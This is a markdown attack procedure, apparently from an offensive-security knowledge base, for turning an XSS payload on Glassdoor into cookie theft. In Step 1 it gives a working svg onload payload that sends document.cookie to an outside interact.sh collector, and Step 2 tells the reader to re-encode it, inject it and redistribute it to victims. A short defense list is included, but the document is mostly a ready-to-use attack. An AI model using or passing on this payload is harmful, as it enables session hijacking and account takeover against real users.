---
tags:
  - xss
  - cookie-theft
  - data-exfiltration
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:49.464Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 251f4f4d-ef20-497f-94df-e3b0a87eaa99
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[JavaScript]]'
---
# Modify-Payload-for-Cookie-Exfiltration

## Summary

This procedure adapts the XSS payload to target document.cookie instead of document.domain, enabling theft of non-HttpOnly session cookies for potential account takeover.

## Description

By replacing document.domain with document.cookie in the onload redirect, the payload sends cookie strings in the URI upon execution. This escalates from domain recon to session hijacking. Only non-HttpOnly cookies are accessible via JS. Expected outcome: Cookies exfiltrated, usable in subsequent attacks.

## Requirements

1. Base payload and encoding tools from Step 1
2. Burp Suite for re-encoding
3. Active victim session on Glassdoor

## Defense

Defensive measures and detection strategies:

- Set HttpOnly flags on sensitive session cookies
- Implement cookie prefixing (e.g., __Host-) and secure attributes
- Detect anomalous cookie access patterns in JS execution logs
- Use client-side encryption or token binding for sessions

## Objectives

1. Steal session cookies from the victim's browser
2. Enable session hijacking or impersonation
3. Demonstrate escalated impact from the XSS

## Instructions

### Step 1: Update the Payload

**Context**: Modify the JS to access cookies instead of domain.

Change to: `<!DOCTYPE html><html><svg/onload=location/**/='https://c3rqmwkyedf0000r3mr0gbhm4scyyyyyb.interact.sh/'+document.cookie></html><!--`.

> This appends cookie key-value pairs to the URI. Expected output: Updated raw payload.

### Step 2: Re-Encode and Re-Inject

**Context**: Encode the new payload and test injection as in prior steps.

Use Burp Suite to URL-encode, then inject into callback and send request.

> Expected output: Encoded version reflects correctly. Repeat distribution and monitoring for cookie data in URI, e.g., `/sessionid=abc123;user=john`.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Steal Web Session Cookie]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss]]
- [[cookie-theft]]
